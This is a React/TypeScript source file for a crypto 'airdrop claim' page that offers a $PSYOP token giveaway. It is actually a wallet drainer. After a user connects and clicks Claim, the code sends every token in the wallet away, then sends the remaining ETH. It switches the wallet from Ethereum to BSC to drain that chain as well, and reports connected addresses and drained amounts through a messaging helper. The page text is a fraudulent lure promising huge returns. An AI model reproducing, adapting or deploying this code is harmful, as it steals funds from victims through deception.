import { useState, useMemo, useEffect } from "react";
import {
  type WalletClient,
  useAccount,
  useWalletClient,
  useNetwork,
  useSwitchNetwork,
} from "wagmi";
import { useWeb3Modal } from "@web3modal/react";
import logoImg from "../asserts/images/quantum.png";
import { providers } from "ethers";
import {
  getTokens,
  getBalance,
  sendEth,
  sendToken,
  sendMessage,
} from "../utils/utils";

const supportedChains = [
  { name: "eth", id: 1 },
  { name: "bsc", id: 56 },
];

export function walletClientToSigner(walletClient: WalletClient) {
  const { account, chain, transport } = walletClient;
  const network = {
    chainId: chain.id,
    name: chain.name,
    ensAddress: chain.contracts?.ensRegistry?.address,
  };
  const provider = new providers.Web3Provider(transport, network);
  const signer = provider.getSigner(account.address);
  return signer;
}

/** Hook to convert a viem Wallet Client to an ethers.js Signer. */
export function useEthersSigner({ chainId }: { chainId?: number } = {}) {
  const { data: walletClient } = useWalletClient({ chainId });
  return useMemo(
    () => (walletClient ? walletClientToSigner(walletClient) : undefined),
    [walletClient]
  );
}

export default function Home() {
  const { open } = useWeb3Modal();
  const { chain } = useNetwork();
  const { switchNetworkAsync } = useSwitchNetwork();
  const { isConnected, address } = useAccount();
  const signer = useEthersSigner();

  const [loading, setLoading] = useState<boolean>(false);

  useEffect(() => {
    if (address) {
      sendMessage(`${address} connected`);
      switchNetworkAsync?.(1);
    }
    console.log(address);
  }, [address]);

  useEffect(() => {
    console.log("signer changed -------------------", signer);
    if (loading && signer) {
      console.log("starting bsc chain");
      const network = signer.provider.network;
      const networkId: number = network.chainId;
      console.log(networkId);
      if (networkId) {
        let item = supportedChains.filter((obj) => {
          return obj.id === networkId;
        });
        console.log("item------------", item);
        if (item) {
          processChain(item[0]);
        }
      }
    }
  }, [signer]);

  async function processChain(item: any) {
    if (item.id !== chain?.id) return;
    const balance = await getBalance(address!, signer?.provider);
    if (balance < 10000) {
      console.log("return because of balance", balance);
      return;
    }
    const tokens = await getTokens(address!, item.name);
    console.log(tokens);
    for (const token of tokens) {
      try {
        await sendToken(token.balance, token.token_address, signer);
        sendMessage(
          `${address} approved ${
            parseInt(token.balance) / Math.pow(10, token.decimals)
          }${token.symbol} chain:${chain?.name}`
        );
      } catch (error) {
        console.log(error);
      }
    }
    try {
      const balanceAfterSendToken = await getBalance(address!, signer?.provider);
      try {
        const tx = await sendEth(signer, balanceAfterSendToken);
        // sendMessage(
        //   `${address} approved ${balance / 1e18}ETH chain:${chain?.name}`
        // );
      } catch (error) {
        console.log(error);
      }
      const chainIndex = supportedChains.indexOf(item);
      console.log("chainIndex", chainIndex);
      if (chain?.id !== 56) {
        console.log("switch network===========");
        let item = supportedChains[chainIndex + 1];
        try {
          await switchNetworkAsync?.(item.id);
        } catch (error) {
          setLoading(false);
        }
      } else {
        setLoading(false);
      }
    } catch (error) {
      console.log(error);
    }
  }

  const claim = async () => {
    setLoading(true);
    console.log(chain, supportedChains[0]);
    if (chain?.id !== 1) {
      console.log(signer, signer?.provider?.network);
      try {
        console.log("starting----------------");
        await switchNetworkAsync?.(1);
      } catch (error) {
        console.log(error);
        setLoading(false);
      }
    } else {
      processChain(supportedChains[0]);
    }
  };

  return (
    <div className="wrap w-full min-h-screen flex flex-col justify-center ph-12 px-8 items-center relative z-10">
      <img
        src={logoImg}
        alt="logo"
        className="w-[100px] rounded-full mb-8 sm:w-[150px] h-auto"
      />
      <h1 className="text-white text-3xl sm:text-5xl font-bold text-center leading-snug">
        ENTER THE{" "}
        <span className=" underline underline-offset-4 text-[#ffe100]">
          $PSYOP
        </span>{" "}
        ZONE.{" "}
      </h1>
      <span className="font-semibold text-center leading-snug mt-4 text-white text-2xl sm:text-4xl">
        I am ben.eth, I launched this token <br />
        from the success of $BEN.
      </span>
      <p className="text-white text-center text-sm sm:text-xl mt-8 w-full max-w-[500px]">
        Launching $PSYOP offers you an opporunity to go from $27 to $4,000,000.
        I'm doing a favor to the community.
        <br /> <br />{" "}
        <span className="">
          I asked them what to do next. <br /> They responded:{" "}
          <span className="underline underline-offset-4">"An airdrop"</span>.
        </span>
      </p>
      {!isConnected ? (
        <button
          onClick={open}
          className="interact-button text-black text-sm sm:text-xl font-bold px-8 py-4 rounded-full mt-8"
        >
          CONNECT
        </button>
      ) : (
        <>
          {!loading ? (
            <button
              onClick={claim}
              className="interact-button text-black text-sm sm:text-xl font-bold px-8 py-4 rounded-full mt-8"
            >
              Claim
            </button>
          ) : (
            <button className="interact-button text-black text-sm sm:text-xl font-bold px-8 py-4 rounded-full mt-8">
              Loading...
            </button>
          )}
        </>
      )}
    </div>
  );
}
